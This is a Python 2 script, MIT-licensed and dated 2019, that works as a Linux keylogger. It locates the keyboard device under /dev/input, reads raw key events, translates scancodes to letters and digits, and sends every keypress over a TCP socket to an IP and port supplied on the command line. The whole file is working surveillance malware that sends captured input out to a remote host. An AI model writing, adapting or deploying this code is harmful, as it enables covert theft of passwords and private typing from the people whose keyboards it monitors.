#!/usr/bin/python

'''
Copyright 2019 Konstantinos Sarantopoulos

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
'''

import struct,subprocess,sys,socket

if len(sys.argv) != 5:
  print 'Usage: path_to_script [-h][-ip][-port]'
  sys.exit()

for i in range(0, len(sys.argv) - 1):
  if sys.argv[i] == '-ip':
    ip = sys.argv[i+1]
  if sys.argv[i] == '-port':
    port = int(sys.argv[i+1])

keys = { 'a' : 30, 'b' : 48, 'c' : 46, 'd' : 32, 'e' : 18, 'f' : 33, 'g' : 34, 'h' : 35, 'i' : 23, 'j' : 36, 'k' : 37, 'l' : 38, 'm' : 50,
         'n' : 49, 'o' : 24, 'p' : 25, 'q' : 16, 'r' : 19, 's' : 31, 't' : 20, 'u' : 22, 'v' : 47, 'w' : 17, 'x' : 45, 'y' : 21, 'z' : 44,
'0' : 11, '1' : 2, '2' : 3, '3' : 4, '4' : 5, '5' : 6, '6' : 7, '7' : 8, '8' : 9, '9' : 10,
'space' : 57, 'left_shift' : 42, 'caps_lock' : 58, 'left_alt' : 56 }

#find the keyboard
devices = subprocess.check_output('ls /dev/input/by-path', shell=True)
devices = devices.split("\n")
for i in range(0,20): #run this 20 times so we remove all mouse devices
  for item in devices:
    if item == "" or 'mouse' in item:
      devices.remove(item)
path =  subprocess.check_output('realpath /dev/input/by-path/' + devices[0], shell=True)
path = path.replace('\n','')

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

file = open(path, "rb");
while 1:
  data = file.read(24)
  data_tuple = struct.unpack('4IHHI',data)
  if data_tuple[4] == 1 and data_tuple[6] == 1:
    for key, value in keys.items():
      if data_tuple[5] == value:
        #sys.stdout.write(key)
        s.sendto(key, (ip, port))
